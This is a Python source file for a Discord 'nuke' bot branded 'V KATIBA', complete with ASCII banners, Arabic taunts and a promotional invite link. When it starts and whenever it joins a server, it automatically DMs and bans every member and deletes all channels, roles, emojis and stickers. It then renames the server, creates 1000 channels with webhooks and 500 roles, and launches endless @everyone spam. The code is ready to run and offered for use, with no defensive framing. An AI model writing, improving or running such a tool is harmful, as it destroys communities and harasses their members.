import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import sys

os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# ULTIMATE BANNER
# ============================================
print("""
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                                       ║
║     ██╗   ██╗██╗   ██╗██████╗  █████╗     ██╗     ██╗███████╗ █████╗ ███╗   ██╗██████╗ ██╗ █████╗     ███████╗ ██████╗ ███╗   ██╗                      ║
║     ╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗    ██║     ██║╚══███╔╝██╔══██╗████╗  ██║██╔══██╗██║██╔══██╗    ██╔════╝██╔═══██╗████╗  ██║                      ║
║      ╚████╔╝ ██║   ██║██║  ██║███████║    ██║     ██║  ███╔╝ ███████║██╔██╗ ██║██║  ██║██║███████║    █████╗  ██║   ██║██╔██╗ ██║                      ║
║       ╚██╔╝  ██║   ██║██║  ██║██╔══██║    ██║     ██║ ███╔╝  ██╔══██║██║╚██╗██║██║  ██║██║██╔══██║    ██╔══╝  ██║   ██║██║╚██╗██║                      ║
║        ██║   ╚██████╔╝██████╔╝██║  ██║    ███████╗██║███████╗██║  ██║██║ ╚████║██████╔╝██║██║  ██║    ██║     ╚██████╔╝██║ ╚████║                      ║
║        ╚═╝    ╚═════╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝                      ║
║                                                                                                                                                       ║
║                                   ╔═══════════════════════════════════════════════════════════════════════════════════════════╗                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    🏆🏆🏆 اليد العليا فون - V KATIBA EDITION 🏆🏆🏆                           ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    🔥🔥🔥 فون لي يضربلك الطبون - قوة مليار مره 🔥🔥🔥                         ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    💀💀💀 مينيطا خطيك ما دير لي تيم بسك 💀💀💀                               ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    ⚡⚡⚡ حنا الكتيبة مشي سراقين لي تولز ⚡⚡⚡                                 ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    💪💪💪 الكتيبة الأصليين - اليد العليا - V KATIBA 💪💪💪                    ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ╚═══════════════════════════════════════════════════════════════════════════════════════════╝                       ║
║                                                                                                                                                       ║
║                                   🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                       ║
║                                                                                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

# ============================================
# INTENTS - ENABLED ALL
# ============================================
intents = discord.Intents.all()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ============================================
# COLORS
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# ULTIMATE BAN MESSAGE مع رابط السيرفر
# ============================================
BAN_MESSAGE = f"""
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                                       ║
║                                   ██╗   ██╗██╗   ██╗██████╗  █████╗                                                                                   ║
║                                   ╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗                                                                                  ║
║                                    ╚████╔╝ ██║   ██║██║  ██║███████║                                                                                  ║
║                                     ╚██╔╝  ██║   ██║██║  ██║██╔══██║                                                                                  ║
║                                      ██║   ╚██████╔╝██████╔╝██║  ██║                                                                                  ║
║                                      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝  ╚═╝                                                                                  ║
║                                                                                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
║                    ║                                                                                                                               ║  ║
║                    ║                          🏆🏆🏆🏆🏆 اليد العليا فون - V KATIBA 🏆🏆🏆🏆🏆                                                    ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🔥🔥🔥🔥🔥 فون لي يضربلك الطبون - قوة مليار مره 🔥🔥🔥🔥🔥                                                 ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    💀💀💀💀💀 مينيطا خطيك ما دير لي تيم بسك 💀💀💀💀💀                                                       ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    ⚡⚡⚡⚡⚡ حنا الكتيبة مشي سراقين لي تولز - الأصليين ⚡⚡⚡⚡⚡                                                 ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    💪💪💪💪💪 الكتيبة الأصليين - اليد العليا - V KATIBA 💪💪💪💪💪                                             ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🎯🎯🎯🎯🎯 فون لي يضربلك الطبون - ضربة قاضية 🎯🎯🎯🎯🎯                                                       ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🚀🚀🚀🚀🚀 V KATIBA - أسرع من البرق 🚀🚀🚀🚀🚀                                                             ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️ مشي سراقين لي تولز - الكتيبة الأصليين 🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️                                 ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                                   🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                    ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                                   ⭐⭐⭐ V KATIBA - V KATIBA - V KATIBA ⭐⭐⭐                                                  ║  ║
║                    ║                                                                                                                               ║  ║
║                    ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
║                                                                                                                                                       ║
║                                   ╔═══════════════════════════════════════════════════════════════════════════════════╗                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║              تم حظرك من قبل الكتيبة اليد العليا فون - V KATIBA                         ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║           فون لي يضربلك الطبون - لن تعود أبداً - V KATIBA                           ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║              الكتيبة الأصليين - اليد العليا - V KATIBA                                ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║              🔗 انضم لسيرفرنا: https://discord.gg/5RqpBkEg 🔗                        ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ╚═══════════════════════════════════════════════════════════════════════════════════╝                              ║
║                                                                                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================
# ULTRA SPAM MESSAGES
# ============================================
SPAM_MESSAGES = [
    "@everyone **🔥🔥🔥 اليد العليا فون - V KATIBA دمرت هذا السيرفر 🔥🔥🔥**",
    "```⚡⚡⚡ فون لي يضربلك الطبون - V KATIBA - فون لي يضربلك الطبون ⚡⚡⚡```",
    "@everyone **💀💀💀 مينيطا خطيك ما دير لي تيم بسك - V KATIBA 💀💀💀**",
    "```🏆🏆🏆 حنا الكتيبة مشي سراقين لي تولز - V KATIBA - الأصليين 🏆🏆🏆```",
    "**🌟🌟🌟 اليد العليا فون - V KATIBA - الكتيبة الأصليين 🌟🌟🌟**",
    "@everyone **💪💪💪 فون لي يضربلك الطبون - V KATIBA - قوة مليار مره 💪💪💪**",
    "@everyone **🎯🎯🎯 اليد العليا - V KATIBA - ضربة قاضية 🎯🎯🎯**",
    "```🚀🚀🚀 V KATIBA - أسرع من البرق 🚀🚀🚀```",
    "@everyone **🏴‍☠️🏴‍☠️🏴‍☠️ V KATIBA - مشي سراقين لي تولز - الكتيبة الأصليين 🏴‍☠️🏴‍☠️🏴‍☠️**",
    "**⚡⚡⚡ اليد العليا فون - V KATIBA - سحق السيرفر بالكامل ⚡⚡⚡**",
    "@everyone **💥💥💥 V KATIBA - فون لي يضربلك الطبون - دمار شامل 💥💥💥**",
    "```🔥🔥🔥 V KATIBA - الكتيبة - اليد العليا - فون 🔥🔥🔥```",
    "@everyone **🏆🏆🏆 V KATIBA - فون لي يضربلك الطبون - اليد العليا فون 🏆🏆🏆**",
    "@everyone **🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗**",
    "```⭐ V KATIBA - V KATIBA - V KATIBA ⭐```",
]

WEBHOOK_NAMES = ["V-KATIBA", "اليد-العليا-فون", "الكتيبة-فون", "فون-الطبون", "KATEBA-POWER"]
CHANNEL_NAMES = ["V-KATIBA", "اليد-العليا", "فون-الطبون", "الكتيبة-فون", "فون", "قوة-مليار"]

# ============================================
# NUKE FUNCTION - DESTROY A SINGLE SERVER
# ============================================
async def destroy_server(guild):
    """Destroy a single server completely"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!!!] V KATIBA - DESTROYING SERVER: {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}")
    
    start_time = time.time()
    
    # Try to get first channel for updates
    first_channel = None
    for ch in guild.text_channels:
        first_channel = ch
        break
    
    if first_channel:
        try:
            await first_channel.send("```🔥🔥🔥 V KATIBA - ULTRA POWER NUKE ACTIVATED 🔥🔥🔥```")
            await first_channel.send("@everyone **💪💪💪 V KATIBA - فون لي يضربلك الطبون - قوة مليار مره 💪💪💪**")
        except:
            pass
    
    # PHASE 1: BAN ALL MEMBERS
    print(f"{Colors.CYAN}[1/6] V KATIBA - BANNING ALL MEMBERS...{Colors.RESET}")
    
    members = []
    async for member in guild.fetch_members(limit=None):
        members.append(member)
    
    total_humans = len([m for m in members if not m.bot])
    banned = 0
    
    for member in members:
        if not member.bot:
            try:
                await member.send(BAN_MESSAGE)
                await asyncio.sleep(0.03)
                await member.ban(reason="V KATIBA - اليد العليا فون", delete_message_days=7)
                banned += 1
                if banned % 20 == 0:
                    print(f"    • V KATIBA باند {banned}/{total_humans}")
                await asyncio.sleep(0.005)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ BANNED {banned} MEMBERS{Colors.RESET}")
    
    # PHASE 2: DELETE ALL CHANNELS
    print(f"{Colors.CYAN}[2/6] DELETING ALL CHANNELS...{Colors.RESET}")
    for ch in guild.channels:
        try:
            await ch.delete(reason="V KATIBA")
            await asyncio.sleep(0.005)
        except:
            pass
    
    # PHASE 3: DELETE ALL ROLES
    print(f"{Colors.CYAN}[3/6] DELETING ALL ROLES...{Colors.RESET}")
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="V KATIBA")
                await asyncio.sleep(0.005)
            except:
                pass
    
    # PHASE 4: DELETE ALL EMOJIS & STICKERS
    print(f"{Colors.CYAN}[4/6] DELETING ALL EMOJIS & STICKERS...{Colors.RESET}")
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.005)
        except:
            pass
    
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.005)
        except:
            pass
    
    # PHASE 5: CHANGE SERVER NAME
    new_name = random.choice(["V KATIBA", "🔥 V KATIBA 🔥", "V KATIBA - اليد العليا", "⚡ V KATIBA ⚡", "💀 V KATIBA 💀"])
    try:
        await guild.edit(name=new_name)
        print(f"{Colors.GREEN}    ✓ RENAMED TO: {new_name}{Colors.RESET}")
    except:
        pass
    
    # PHASE 6: CREATE WEBHOOKS
    print(f"{Colors.CYAN}[5/6] CREATING WEBHOOKS...{Colors.RESET}")
    webhooks = []
    # Create webhooks in new channels (none exist yet, so skip or try alternative)
    # Instead, we'll create channels first, then webhooks
    
    # Create 1000 channels
    print(f"{Colors.CYAN}[6/6] CREATING 1000 CHANNELS + 1000 WEBHOOKS + 500 ROLES...{Colors.RESET}")
    for i in range(1000):
        try:
            new_ch = await guild.create_text_channel(name=f"V-KATIBA-{random.choice(CHANNEL_NAMES)}-{i}")
            if i % 100 == 0 and i > 0:
                print(f"    • CREATED {i} CHANNELS")
            # Create webhook in this channel
            try:
                webhook = await new_ch.create_webhook(name=random.choice(WEBHOOK_NAMES))
                webhooks.append(webhook)
            except:
                pass
            await asyncio.sleep(0.005)
        except:
            pass
    
    # Create 500 roles
    for i in range(500):
        try:
            await guild.create_role(name=f"V-KATIBA-{random.choice(WEBHOOK_NAMES)}-{i}", color=discord.Color.red())
            if i % 100 == 0 and i > 0:
                print(f"    • CREATED {i} ROLES")
            await asyncio.sleep(0.005)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ CREATED CHANNELS, WEBHOOKS, AND ROLES{Colors.RESET}")
    
    # Start infinite spam
    async def spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(0.01)
                except:
                    pass
            await asyncio.sleep(0.05)
    
    asyncio.create_task(spam())
    
    if webhooks:
        async def webhook_spam():
            async with aiohttp.ClientSession() as session:
                while True:
                    for webhook in webhooks:
                        try:
                            data = {"content": random.choice(SPAM_MESSAGES), "username": random.choice(WEBHOOK_NAMES)}
                            async with session.post(webhook.url, json=data) as resp:
                                pass
                            await asyncio.sleep(0.008)
                        except:
                            pass
                    await asyncio.sleep(0.05)
        asyncio.create_task(webhook_spam())
    
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓✓✓] V KATIBA - SERVER DESTROYED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • SERVER: {guild.name}")
    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS")
    print(f"{Colors.GREEN}    • NEW NAME: {new_name}")
    print(f"{Colors.GREEN}    • CHANNELS: 1000 CREATED")
    print(f"{Colors.GREEN}    • WEBHOOKS: {len(webhooks)}")
    print(f"{Colors.GREEN}    • ROLES: 500 CREATED")
    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}\n")

# ============================================
# ON GUILD JOIN - Auto nuke when added to new server
# ============================================
@bot.event
async def on_guild_join(guild):
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[!] BOT ADDED TO NEW SERVER: {guild.name}{Colors.RESET}")
    print(f"{Colors.RED}[!!!] AUTO-NUKE ACTIVATED! DESTROYING SERVER...{Colors.RESET}")
    
    # Send message in first channel if possible
    for channel in guild.text_channels:
        try:
            await channel.send("```🔥🔥🔥 V KATIBA - AUTO-NUKE ACTIVATED 🔥🔥🔥```")
            await channel.send("@everyone **💀💀💀 هذه نهاية سيرفركم 💀💀💀**")
            break
        except:
            pass
    
    # Destroy the server
    await destroy_server(guild)

# ============================================
# ON READY - NUKE ALL EXISTING SERVERS
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ V KATIBA - اليد العليا فون BOT ONLINE: {bot.user.name}{' ' * (35 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (80 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS FOUND: {len(bot.guilds)}{' ' * (79 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🚀🚀🚀 V KATIBA - AUTO-NUKE MODE ACTIVATED 🚀🚀🚀                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              💪💪💪 WILL DESTROY ALL SERVERS IMMEDIATELY 💪💪💪                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                                                       ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    print(f"\n{Colors.BOLD}{Colors.RED}[!!!] AUTO-NUKE STARTING! DESTROYING {len(bot.guilds)} SERVERS...{Colors.RESET}\n")
    
    # Destroy all servers the bot is in
    for guild in bot.guilds:
        await destroy_server(guild)
        await asyncio.sleep(2)  # Small delay between servers
    
    print(f"\n{Colors.BOLD}{Colors.GREEN}[✓✓✓] ALL SERVERS DESTROYED!{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}[!] BOT WILL NOW STAY ONLINE FOR ANY NEW SERVERS{Colors.RESET}\n")

# ============================================
# RUN
# ============================================
print(f"\n{Colors.BOLD}{Colors.YELLOW}[!] Starting bot...{Colors.RESET}")
bot.run(TOKEN)
